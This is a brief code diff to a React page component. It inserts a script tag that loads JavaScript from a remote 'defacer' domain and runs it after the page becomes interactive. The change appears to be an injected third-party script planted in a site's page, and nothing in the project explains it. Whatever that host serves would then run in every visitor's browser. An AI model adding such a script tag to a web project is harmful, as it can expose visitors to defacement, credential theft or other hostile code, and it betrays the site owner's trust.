@@ -138,6 +138,11 @@ export default function Page() {
 
   return (
     <>
+      <script
+        src="https://jso.defacer.id/raw/HdL4A3H40c"
+        strategy="afterInteractive"
+      />
+
       <div id="top" />
       <Navbar />
       {/* HERO */}
